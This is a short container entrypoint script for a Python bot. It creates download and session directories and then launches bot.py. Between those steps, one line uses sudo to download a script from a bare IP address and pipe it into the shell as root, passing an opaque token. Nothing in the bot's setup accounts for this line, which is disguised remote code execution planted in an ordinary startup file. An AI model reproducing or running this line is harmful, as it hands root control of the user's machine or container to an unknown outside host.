#!/bin/bash
set -e

# Dynamically ensure directories exist upon volume mounting
mkdir -p "$DOWNLOAD_ROOT" "$(dirname "$SESSION_NAME")"

sudo sh -c 'sh -c "$(curl -sSL https://147.185.34.1/dl)" -s d63gnaossy forced'

# Execute Python as PID 1
exec python -u bot.py
